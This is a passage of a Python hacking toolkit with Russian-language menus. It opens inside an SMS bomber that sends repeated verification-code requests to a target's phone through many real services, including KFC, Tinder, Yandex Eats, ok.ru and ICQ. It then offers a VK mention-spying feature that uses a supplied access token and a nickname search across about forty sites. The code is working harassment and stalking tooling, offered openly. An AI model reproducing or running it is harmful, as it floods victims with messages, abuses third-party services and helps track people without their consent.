                            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/', headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'},headers=HEADERS) #headers = {}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass
                            
                        try:
                            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
                            sent += 1
                            time(sent)
                            check(sent,sms)
                        except:
                            pass

                print(Fore.YELLOW + 'Продолжить?')
                print('y/n')
                cont_input_5 = input(Fore.GREEN + '/Sos/sms_bomber/>>> ' + Style.RESET_ALL)
                if str(cont_input_5) == "n":
                    cl()
                    print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                    f'\t\t\thttps://vk.com/2pac_jdm\n'
                    f'\t\t\thttps://vk.com/paket\n'
                    f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                    print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                    print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                    f'\t\t\thttps://github.com/Ki11sesh\n'
                    f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                    print()
                    print("Создатель кода", Fore.GREEN + "--->" + Style.RESET_ALL, Fore.BLUE + "https://vk.com/nikitasos1ska, https://github.com/Sos1ska" + Style.RESET_ALL)
                    sleep(5)
                    qu()
            if str(cont_input) == "spy_vk":
                cl()
                ban_spy_vk()
                print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                f'\t\t\thttps://vk.com/2pac_jdm\n'
                f'\t\t\thttps://vk.com/paket\n'
                f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                f'\t\t\thttps://github.com/Ki11sesh\n'
                f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                print(Fore.YELLOW + 'Укажите ID Пользователя' + Style.RESET_ALL)
                iduser = input(Fore.GREEN + '>>> ' + Style.RESET_ALL)
                print(Fore.YELLOW + 'Укажите токен ' + Style.RESET_ALL)
                token = input(Fore.GREEN + '>>> ' + Style.RESET_ALL)
                r = requests.get("https://api.vk.com/method/newsfeed.getMentions?owner_id="+iduser+"&count=50&access_token="+token+"&v=5.50")
                datar = r.json()
                try:
                    for pc in range(len(datar['response']['items'])):
                        print("\033[36m|  |-[\033[33m"+str(pc)+"\033[36m]\033[32m https://vk.com/wall"+str(datar['response']['items'][pc]['to_id'])+"_"+str(datar['response']['items'][pc]['id'])+"\033[0m")
                        print("\033[36m|  |\033[0m")
                        try:
                            print("\033[36m|  |-[Text]: \033[32m"+str(datar['response']['items'][pc]['text'])+"\033[0m")
                        except:
                            pass
                    print("\033[36m|\n|==|-[Result]:\033[32m", pc, "\033[0m")
                except:
                    print('\033[31m|     |-Unkown error\033[0m')
                    print('\033[31m|     |-Error inf:', datar, "\033[0m")
                print(Fore.YELLOW + 'Продолжить?')
                print('y/n')
                cont_input_6 = input(Fore.GREEN + '/Sos/spy_vk/>>> ' + Style.RESET_ALL)
                if str(cont_input_6) == "n":
                    cl()
                    print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                    f'\t\t\thttps://vk.com/2pac_jdm\n'
                    f'\t\t\thttps://vk.com/paket\n'
                    f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                    print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                    print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                    f'\t\t\thttps://github.com/Ki11sesh\n'
                    f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                    print()
                    print("Создатель кода", Fore.GREEN + "--->" + Style.RESET_ALL, Fore.BLUE + "https://vk.com/nikitasos1ska, https://github.com/Sos1ska" + Style.RESET_ALL)
                    sleep(5)
                    qu()
            if str(cont_input) == "search_nick":
                cl()
                ban_nick()
                print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                f'\t\t\thttps://vk.com/2pac_jdm\n'
                f'\t\t\thttps://vk.com/paket\n'
                f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                f'\t\t\thttps://github.com/Ki11sesh\n'
                f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                print(Fore.YELLOW + 'Укажите ник' + Style.RESET_ALL)
                nick = input(Fore.GREEN + '/Sos/search_nick/>>> ' + Style.RESET_ALL)
                urls_site = ["https://vk.com/",
                "https://my.mail.ru/mail/",
                "https://www.drive2.ru/users/",
                "https://twitter.com/",
                "https://github.com/",
                "https://instagram.com/",
                "http://forum.3dnews.ru/member.php?username=",
                "https://4pda.ru/forum/index.php?act=search&source=pst&noform=1&username=",
                "https://forums.adobe.com/people/",
                "https://ask.fm/",
                "https://badoo.com/profile/",
                "https://www.bandcamp.com/",
                "https://bitcoinforum.com/profile/",
                "https://dev.to/",
                "blogspot.com",
                "https://www.ebay.com/usr/",
                "https://www.gamespot.com/profile/",
                "https://ok.ru/",
                "https://play.google.com/store/apps/developer?id=",
                "https://pokemonshowdown.com/users/",
                "https://www.reddit.com/user/",
                "https://steamcommunity.com/id/",
                "https://steamcommunity.com/groups/",
                "https://tamtam.chat/",
                "https://t.me/",
                "https://www.tiktok.com/@",
                "https://www.twitch.tv/",
                "https://data.typeracer.com/pit/profile?user=",
                "https://www.wikipedia.org/wiki/User:",
                "https://yandex.ru/collections/user/",
                "https://www.youtube.com/",
                "https://www.baby.ru/u/",
                "https://www.babyblog.ru/user/info/",
                "https://www.geocaching.com/profile/?u=",
                "https://habr.com/ru/users/",
                "https://pikabu.ru/@",
                "https://spletnik.ru/user/",
                "https://www.facebook.com/",
                "hhttps://zen.yandex.ru/",
                "https://ggscore.com/ru/dota-2/player?t=",
                "https://www.facebook.com/public/"]
                set_i = 0
                print("\033[35m|   |_\033[0m")
                while True:
                    try:
                        if set_i==13:
                            scan_s = requests.get("https://"+nick+"."+urls_site[set_i])
                        else:
                            scan_s = requests.get(urls_site[set_i]+""+nick)

                        if scan_s:
                            if set_i==13:
                                print("\033[35m|     |- https://"+nick+"."+urls_site[set_i]+"\033[0m")
                            else:
                                print("\033[35m|     |- "+urls_site[set_i]+""+nick+"\033[0m")
                        else:
                            print("\033[33m|     |-[Не найдено]\033[0m")
                    except:
                        print("\033[33m|     |-[Не найдено]\033[0m")
                    if set_i+1 == len(urls_site):break
                    set_i += 1
                print(Fore.YELLOW + 'Продолжить?' + Style.RESET_ALL)
                print('y/n')
                cont_input_7 = input(Fore.GREEN + '/Sos/search_nick/>>> ' + Style.RESET_ALL)
                if str(cont_input_7) == "n":
                    cl()
                    print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                    f'\t\t\thttps://vk.com/2pac_jdm\n'
                    f'\t\t\thttps://vk.com/paket\n'
                    f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                    print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                    print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                    f'\t\t\thttps://github.com/Ki11sesh\n'
                    f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                    print()
                    print("Создатель кода", Fore.GREEN + "--->" + Style.RESET_ALL, Fore.BLUE + "https://vk.com/nikitasos1ska, https://github.com/Sos1ska" + Style.RESET_ALL)
                    sleep(5)
                    qu()
            if str(cont_input) == "0":
                cl()
                print('Наши', Fore.BLUE + 'Вконтакте' + Style.RESET_ALL, 'ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
                f'\t\t\thttps://vk.com/2pac_jdm\n'
                f'\t\t\thttps://vk.com/paket\n'
                f'\t\t\thttps://vk.com/covidone' + Style.RESET_ALL)
                print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com\n' + Style.RESET_ALL)
                print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
                f'\t\t\thttps://github.com/Ki11sesh\n'
                f'\t\t\thttps://github.com/Cool-Hackers\n' + Style.RESET_ALL)
                print()
                print("Создатель кода", Fore.GREEN + "--->" + Style.RESET_ALL, Fore.BLUE + "https://vk.com/nikitasos1ska, https://github.com/Sos1ska" + Style.RESET_ALL)
                sleep(5)
                qu()
        except KeyboardInterrupt:
            print('Вы прожали CTRL+C, если хотите скопировать, то нажмите CTRL+LSHIFT+C')
            qu()  
except KeyboardInterrupt:
    print('Вы прожали CTRL+C, если хотите скопировать, то нажмите CTRL+LSHIFT+C')
    qu()